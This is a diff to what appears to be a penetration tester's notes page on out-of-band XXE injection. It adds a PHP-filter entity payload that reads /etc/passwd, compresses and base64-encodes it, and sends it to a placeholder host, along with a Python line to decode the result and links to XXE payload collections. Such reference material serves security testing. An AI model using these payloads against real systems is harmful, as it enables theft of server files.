@@ -34,7 +34,25 @@ POST http://example.com/xml HTTP/1.1
 %all;
 ```
 
+### PHP Filters
+
+```markup
+<!ENTITY % data SYSTEM " php://filter/read=zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+```
+
+Result can be decoded using Python:
+
+```python
+zlib.decompress(base64.b64decode(req), -15) 
+```
+
 #### References
 
-[Acunetix - Out-of-band XML External Entity \(OOB-XXE\)](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)
+[Acunetix - Out-of-band XML External Entity \(OOB-XXE\)](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)  
+[XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)  
+[PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injections)  
+[xxe\_oob\_exfil.py](https://gist.github.com/Reboare/49b309711222254eaf970e90388a7bdf)
+
+
 
